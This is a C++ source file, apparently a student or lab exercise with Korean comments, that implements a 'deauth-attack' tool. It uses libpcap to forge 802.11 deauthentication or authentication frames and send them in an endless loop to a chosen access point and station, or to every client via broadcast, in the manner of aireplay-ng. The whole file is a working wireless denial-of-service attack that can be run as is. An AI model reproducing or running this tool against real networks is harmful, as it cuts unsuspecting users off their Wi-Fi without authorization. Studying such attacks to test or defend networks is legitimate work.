#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h> // sleep, usleep
#include "MacAddr.h"
#include "Dot11.h"

/*
 * syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]
 * sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
 *
 * - <ap mac> 만 주어지면 => AP -> Broadcast (ff:ff:ff:ff:ff:ff) Deauth
 * - <ap mac> + <station mac> => AP -> Station or Station -> AP
 * - -auth => subtype=0xB0(Authentication), 아니면 subtype=0xC0(Deauthentication)
 *
 * Deauth Frame: [ RadiotapHdr ][ Dot11Hdr ][ ReasonCode(2bytes) ]
 * Auth Frame:   [ RadiotapHdr ][ Dot11Hdr ][ AuthFixedFields(6bytes => Algorithm(2), Seq(2), Status(2)) ]
 *
 * => aireplay-ng -0 1 -a <AP> -c <Station> => Deauth
 * => aireplay-ng -1 1 -a <AP> -h <Station> => Auth
 */

#pragma pack(push, 1)
// Radiotap 헤더(간단 버전 8바이트)
struct RadioTapHdr {
    uint8_t  revision;
    uint8_t  pad;
    uint16_t length;
    uint32_t presentFlags; // 안 쓰면 0
};

// Deauth 고정 필드: Reason Code(2 bytes)
struct DeauthFixed {
    uint16_t reasonCode;
};

// Auth 고정 필드: Open System(00 00), seq=0x0001, status=0
struct AuthFixed {
    uint16_t authAlgorithm; // 0: Open System
    uint16_t authSeq;       // 1
    uint16_t statusCode;    // 0 (successful)
};
#pragma pack(pop)

// 문자열 "00:11:22:33:44:55" => MacAddr
bool parseMac(const std::string& str, MacAddr& mac) {
    uint8_t tmp[6];
    int res = sscanf(str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    if (res != 6) return false;
    mac = MacAddr(tmp);
    return true;
}

/*
 * Build Deauth or Auth Frame
 *   - broadcast: stationMac="ff:ff:ff:ff:ff:ff"
 *   - unicast: stationMac=상대
 *   - subtype=0xC0 => deauth (reason code=7 예시)
 *   - subtype=0xB0 => auth   (open system)
 */
static bool buildMgmtFrame(
    uint8_t* packetBuf,
    int& packetLen,
    const MacAddr& apMac,
    const MacAddr& stMac,
    bool isDeauth,
    bool isBroadcast)
{
    // 1) Radiotap
    RadioTapHdr* rth = (RadioTapHdr*)packetBuf;
    rth->revision = 0;
    rth->pad = 0;
    rth->length = sizeof(RadioTapHdr); // 8
    rth->presentFlags = 0;            // 아무 정보 없음
    int offset = sizeof(RadioTapHdr);

    // 2) Dot11Hdr (24바이트)
    Dot11Hdr* dot11 = (Dot11Hdr*)(packetBuf + offset);
    memset(dot11, 0, sizeof(Dot11Hdr));

    // frameControl: type=0(mgmt) + subtype
    // deauth => 0xC0, auth => 0xB0
    uint16_t subtype = (isDeauth ? FC_SUBTYPE_DEAUTH : FC_SUBTYPE_AUTH);
    dot11->frameControl = subtype;  // 리틀엔디안
    dot11->duration = 0;

    // 보통 "AP -> Station" 형식(From DS=1, To DS=0)은 mgmt프레임에서 크게 의미 없지만...
    // 실제 aireplay-ng는 Deauth시 "addr1=Station", "addr2=AP", "addr3=AP" 형태.

    // addr1: 수신자(Station or broadcast)
    if (isBroadcast) {
        memset(dot11->addr1, 0xFF, 6); // ff:ff:ff:ff:ff:ff
    } else {
        memcpy(dot11->addr1, stMac.data(), 6);
    }
    // addr2: 송신자(AP)
    memcpy(dot11->addr2, apMac.data(), 6);
    // addr3: BSSID(AP)
    memcpy(dot11->addr3, apMac.data(), 6);

    dot11->seqCtrl = 0;
    offset += sizeof(Dot11Hdr);

    // 3) Fixed Management fields
    if (isDeauth) {
        // reason code(2)
        DeauthFixed* df = (DeauthFixed*)(packetBuf + offset);
        df->reasonCode = 0x0007; // 예: class3 frame received from nonassociated STA
        offset += sizeof(DeauthFixed);
    } else {
        // auth => AuthFixed(6 bytes)
        AuthFixed* af = (AuthFixed*)(packetBuf + offset);
        af->authAlgorithm = 0x0000; // Open System
        af->authSeq       = 0x0001;
        af->statusCode    = 0x0000;
        offset += sizeof(AuthFixed);
    }

    packetLen = offset;
    return true;
}

int main(int argc, char* argv[]) {
    // Usage parse
    // deauth-attack <interface> <ap mac> [<station mac> [-auth]]
    if (argc < 3) {
        std::cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"
                  << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
        return -1;
    }

    std::string interface = argv[1];
    std::string apStr     = argv[2];

    MacAddr apMac;
    if (!parseMac(apStr, apMac)) {
        std::cerr << "[-] Invalid AP MAC: " << apStr << "\n";
        return -1;
    }

    bool haveStation = false;
    MacAddr stMac;
    bool doAuth = false;

    if (argc >= 4) {
        // 3rd param could be station MAC or "-auth"
        std::string third = argv[3];
        if (third == "-auth") {
            // no station mac, just broadcast + auth
            doAuth = true;
        } else {
            // station mac
            if (!parseMac(third, stMac)) {
                std::cerr << "[-] Invalid Station MAC: " << third << "\n";
                return -1;
            }
            haveStation = true;

            // 4th param might be "-auth"
            if (argc >= 5) {
                std::string fourth = argv[4];
                if (fourth == "-auth") {
                    doAuth = true;
                }
            }
        }
    }

    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << interface << ") failed: " << errbuf << "\n";
        return -1;
    }

    // Radiotap/Monitor check
    if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO) {
        std::cerr << "[-] Not a Radiotap(802.11) interface. Try enabling monitor mode.\n";
        pcap_close(handle);
        return -1;
    }

    // Info
    std::cout << "[*] Interface: " << interface << "\n";
    std::cout << "[*] AP MAC: " << (std::string)apMac << "\n";
    if (haveStation) {
        std::cout << "[*] Station MAC: " << (std::string)stMac << "\n";
    } else {
        std::cout << "[*] Station MAC: <broadcast>\n";
    }
    if (doAuth) {
        std::cout << "[*] Attack Type: Authentication\n";
    } else {
        std::cout << "[*] Attack Type: Deauthentication\n";
    }

    // Build packet
    static uint8_t packetBuf[128];
    int packetLen = 0;

    bool isBroadcast = (!haveStation); // if no station => broadcast
    bool isDeauth    = (!doAuth);      // if -auth => false => build auth, else deauth

    if (!buildMgmtFrame(packetBuf, packetLen, apMac, stMac, isDeauth, isBroadcast)) {
        std::cerr << "[-] Failed to build mgmt frame\n";
        pcap_close(handle);
        return -1;
    }

    // Now send it repeatedly (CTRL+C to stop)
    std::cout << "[*] Sending frames...\n";
    while (true) {
        // pcap_sendpacket(handle, buf, len)
        if (pcap_sendpacket(handle, packetBuf, packetLen) != 0) {
            std::cerr << "[!] pcap_sendpacket error: " << pcap_geterr(handle) << "\n";
        }

        // 100ms sleep, to avoid over-flooding
        usleep(100000);
    }

    // end
    pcap_close(handle);
    return 0;
}
